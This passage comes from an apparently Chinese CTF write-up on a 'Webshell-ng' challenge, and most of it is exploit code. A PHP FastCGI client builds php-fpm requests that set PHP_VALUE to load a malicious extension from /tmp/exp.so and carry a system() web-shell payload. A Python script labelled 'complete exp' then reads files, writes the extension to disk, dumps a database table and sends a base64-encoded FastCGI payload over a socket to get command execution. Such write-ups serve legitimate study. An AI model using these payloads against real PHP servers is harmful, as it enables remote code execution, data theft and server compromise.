class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">BEGIN_REQUEST</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="title function_ invoke__">chr</span>(<span class="built_in">self</span>::<span class="variable constant_">RESPONDER</span>) . <span class="title function_ invoke__">chr</span>((<span class="keyword">int</span>) <span class="variable">$this</span>-&gt;_keepAlive) . <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildNvpair</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">PARAMS</span>, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">PARAMS</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">STDIN</span>, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">STDIN</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;  <span class="comment">//SCRIPT_FILENAME</span></span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">FCGIClient</span>(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="comment">// php payload -- Doesnt do anything</span></span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;extension = /tmp/exp.so&quot;</span>;</span><br><span class="line"><span class="variable">$php_admin_value</span> = <span class="string">&quot;extension = /tmp/exp.so&quot;</span>;</span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9000&#x27;</span>, <span class="comment">//靶机fpm的监听端口</span></span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; <span class="number">0</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同样的脚本，改改 extension 就行，其它参数关系不大.</p><p><img src="/2023/12/04/JQCTF-Webshell-ng/1702201651915.png" alt="1702201651915"></p><h1 id="完整-exp"><span id="完整-exp"> 完整 exp</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import inspect</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://127.0.0.1:10800/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">sql</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    NEW ReflectionClass mysqli refClass</span></span><br><span class="line"><span class="string">    ICALL refClass newInstanceArgs mysqli_arg mysqli1</span></span><br><span class="line"><span class="string">    ICALL mysqli1 query query_arg result</span></span><br><span class="line"><span class="string">    ICALL result fetch_all res row</span></span><br><span class="line"><span class="string">    CALL var_dump row _</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;mysqli&quot;</span>: <span class="string">&quot;mysqli&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mysqli_arg&quot;</span>: [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;web&quot;</span>, <span class="string">&quot;web&quot;</span>, <span class="string">&quot;web&quot;</span>],</span><br><span class="line">        <span class="string">&quot;query_arg&quot;</span>: <span class="string">&quot;select * from f1ag&quot;</span>,</span><br><span class="line">        <span class="string">&quot;res&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">scandir</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    CALL scandir a1 r1</span></span><br><span class="line"><span class="string">    CALL var_dump r1 r2</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;a1&quot;</span>: <span class="string">&quot;/tmp&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">readfile</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    CALL file_get_contents a1 r1</span></span><br><span class="line"><span class="string">    CALL var_dump r1 r2</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;a1&quot;</span>: <span class="string">&quot;/var/www/html/config.php&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">writefile</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    NEW ReflectionFunction a1 file_put_contents</span></span><br><span class="line"><span class="string">    ICALL file_put_contents invokeArgs a2 _</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;a1&quot;</span>: <span class="string">&quot;file_put_contents&quot;</span>,</span><br><span class="line">        <span class="string">&quot;a2&quot;</span>: [<span class="string">&quot;/tmp/success.txt&quot;</span>, <span class="string">&quot;success&quot;</span>],</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">write_ext</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    NEW ReflectionFunction file_put_contents file_put_contents</span></span><br><span class="line"><span class="string">    ICALL file_put_contents invokeArgs a2 _</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    ext = <span class="title function_ invoke__">open</span>(<span class="string">&quot;exp.so&quot;</span>, <span class="string">&quot;rb&quot;</span>).<span class="title function_ invoke__">read</span>()</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;file_put_contents&quot;</span>: <span class="string">&quot;file_put_contents&quot;</span>,</span><br><span class="line">        <span class="string">&quot;a2&quot;</span>: [<span class="string">&quot;/tmp/exp.so&quot;</span>, ext],</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">fpm_attack</span>():</span><br><span class="line">    code = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    CALL base64_decode fpm_data fpm_data</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NEW ReflectionFunction fsockopen fsockopen</span></span><br><span class="line"><span class="string">    ICALL fsockopen invokeArgs fsockopen_args sock</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NEW ArrayObject arg_array arg_array</span></span><br><span class="line"><span class="string">    ICALL arg_array offsetUnset offset _</span></span><br><span class="line"><span class="string">    ICALL arg_array append sock _</span></span><br><span class="line"><span class="string">    ICALL arg_array append fpm_data _</span></span><br><span class="line"><span class="string">    CALL iterator_to_array arg_array data</span></span><br><span class="line"><span class="string">    NEW ReflectionFunction fwrite fwrite</span></span><br><span class="line"><span class="string">    ICALL fwrite invokeArgs data _</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CALL fflush sock _</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NEW ArrayObject arg_array_1 arg_array_1</span></span><br><span class="line"><span class="string">    ICALL arg_array_1 offsetUnset offset _</span></span><br><span class="line"><span class="string">    ICALL arg_array_1 append sock _</span></span><br><span class="line"><span class="string">    ICALL arg_array_1 append length _</span></span><br><span class="line"><span class="string">    CALL iterator_to_array arg_array_1 data</span></span><br><span class="line"><span class="string">    NEW ReflectionFunction fread fread</span></span><br><span class="line"><span class="string">    ICALL fread invokeArgs data socks_read</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CALL bin2hex socks_read socks_read</span></span><br><span class="line"><span class="string">    CALL var_dump socks_read _</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CALL file_get_contents file_arg r1</span></span><br><span class="line"><span class="string">    CALL var_dump r1 _</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code = inspect.<span class="title function_ invoke__">cleandoc</span>(code)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;fpm_data&quot;</span>: <span class="string">&quot;AQEAAQAIAAAAAQAAAAAAAAEEAAEBnwAAEQtHQVRFV0FZX0lOVEVSRkFDRUZhc3RDR0kvMS4wDgRSRVFVRVNUX01FVEhPRFBPU1QPGVNDUklQVF9GSUxFTkFNRS92YXIvd3d3L2h0bWwvYWRkX2FwaS5waHALDFNDUklQVF9OQU1FL2FkZF9hcGkucGhwDA5RVUVSWV9TVFJJTkdjb21tYW5kPXdob2FtaQsbUkVRVUVTVF9VUkkvYWRkX2FwaS5waHA/Y29tbWFuZD13aG9hbWkMDERPQ1VNRU5UX1VSSS9hZGRfYXBpLnBocAkXUEhQX1ZBTFVFZXh0ZW5zaW9uID0gL3RtcC9leHAuc28PDVNFUlZFUl9TT0ZUV0FSRTgwc2VjL3dvZmVpd28LCVJFTU9URV9BRERSMTI3LjAuMC4xCwRSRU1PVEVfUE9SVDkwMDALCVNFUlZFUl9BRERSMTI3LjAuMC4xCwJTRVJWRVJfUE9SVDgwCwlTRVJWRVJfTkFNRWxvY2FsaG9zdA8IU0VSVkVSX1BST1RPQ09MSFRUUC8xLjEOAUNPTlRFTlRfTEVOR1RIMAEEAAEAAAAAAQUAAQAxAAA8P3BocCBzeXN0ZW0oJF9SRVFVRVNUWydjb21tYW5kJ10pOyBwaHBpbmZvKCk7ID8+AQUAAQAAAAA=&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fsockopen&quot;</span>: <span class="string">&quot;fsockopen&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fsockopen_args&quot;</span>: [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9000</span>],</span><br><span class="line">        <span class="string">&quot;arg_array&quot;</span>: [<span class="string">&quot;&quot;</span>],</span><br><span class="line">        <span class="string">&quot;offset&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;fwrite&quot;</span>: <span class="string">&quot;fwrite&quot;</span>,</span><br><span class="line">        <span class="string">&quot;arg_array_1&quot;</span>: [<span class="string">&quot;&quot;</span>],</span><br><span class="line">        <span class="string">&quot;length&quot;</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="string">&quot;fread&quot;</span>: <span class="string">&quot;fread&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file_arg&quot;</span>:<span class="string">&quot;/tmp/flag.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code, data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">run</span>(<span class="attr">func</span>: <span class="keyword">callable</span>):</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">name_convert</span>(<span class="attr">name</span>: str):</span><br><span class="line">        <span class="keyword">match</span> name:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;CALL&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;call&quot;</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;ICALL&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;inst_call&quot;</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;NEW&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;new&quot;</span></span><br><span class="line">            <span class="keyword">case</span> _:</span><br><span class="line">                <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">data_item</span>(<span class="attr">key</span>: str, <span class="attr">value</span>: <span class="keyword">int</span> | str | dict | <span class="keyword">list</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">type</span>(value) == <span class="keyword">int</span>:</span><br><span class="line">            <span class="keyword">return</span> [(key, value)]</span><br><span class="line">        elif <span class="title function_ invoke__">type</span>(value) == str:</span><br><span class="line">            <span class="keyword">return</span> [(key, value)]</span><br><span class="line">        elif <span class="title function_ invoke__">type</span>(value) == bytes:</span><br><span class="line">            <span class="keyword">return</span> [(key, value)]</span><br><span class="line">        elif <span class="title function_ invoke__">type</span>(value) == dict:</span><br><span class="line">            <span class="keyword">new</span> = []</span><br><span class="line">            <span class="keyword">for</span> k in value:</span><br><span class="line">                <span class="keyword">new</span>.<span class="title function_ invoke__">append</span>(<span class="title function_ invoke__">data_item</span>(f<span class="string">&quot;&#123;key&#125;[&#123;k&#125;]&quot;</span>, value[k]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span></span><br><span class="line">        elif <span class="title function_ invoke__">type</span>(value) == <span class="keyword">list</span>:</span><br><span class="line">            <span class="keyword">new</span> = []</span><br><span class="line">            <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(value) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">new</span>.<span class="title function_ invoke__">append</span>((<span class="string">&quot;array[]&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> k in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(value)):</span><br><span class="line">                    <span class="keyword">new</span>.<span class="title function_ invoke__">append</span>(<span class="title function_ invoke__">data_item</span>(f<span class="string">&quot;&#123;key&#125;[&#123;k&#125;]&quot;</span>, value[k]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span></span><br><span class="line">        raise <span class="built_in">Exception</span>(<span class="string">&quot;unsupported type&quot;</span>)</span><br><span class="line"></span><br><span class="line">    def <span class="title function_ invoke__">data_convert</span>(<span class="attr">data</span>: dict):</span><br><span class="line">        def <span class="title function_ invoke__">flatten</span>(something):</span><br><span class="line">            <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(something, (<span class="keyword">list</span>, range)):</span><br><span class="line">                <span class="keyword">for</span> sub in something:</span><br><span class="line">                    <span class="keyword">yield</span> <span class="keyword">from</span> <span class="title function_ invoke__">flatten</span>(sub)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">yield</span> something</span><br><span class="line"></span><br><span class="line">        l = []</span><br><span class="line">        <span class="keyword">for</span> k in data:</span><br><span class="line">            l.<span class="title function_ invoke__">append</span>(<span class="title function_ invoke__">data_item</span>(k, data[k]))</span><br><span class="line">        l = <span class="title function_ invoke__">flatten</span>(l)</span><br><span class="line">        <span class="keyword">return</span> &#123;k[<span class="number">0</span>]: k[<span class="number">1</span>] <span class="keyword">for</span> k in l&#125;</span><br><span class="line"></span><br><span class="line">    code, data = <span class="title function_ invoke__">func</span>()</span><br><span class="line">    code = code.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;\n\n&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    code = code.<span class="title function_ invoke__">split</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    code = <span class="title function_ invoke__">map</span>(lambda <span class="attr">x</span>: x.<span class="title function_ invoke__">split</span>(<span class="string">&quot; &quot;</span>), code)</span><br><span class="line">    code = itertools.chain.<span class="title function_ invoke__">from_iterable</span>(code)</span><br><span class="line">    code = <span class="title function_ invoke__">map</span>(name_convert, code)</span><br><span class="line">    code = <span class="keyword">list</span>(code)</span><br><span class="line">    code = &#123;k: code[k] <span class="keyword">for</span> k in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(code))&#125;</span><br><span class="line">    data = <span class="title function_ invoke__">data_convert</span>(data)</span><br><span class="line">    code = code | data</span><br><span class="line">    res = requests.<span class="title function_ invoke__">post</span>(URL, data=code)</span><br><span class="line">    <span class="keyword">print</span>(res.request.body)</span><br><span class="line">    <span class="keyword">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">run</span>(fpm_attack)</span><br></pre></td></tr></table></figure><p>出题人写的.</p>]]></content>
    
    
      
      
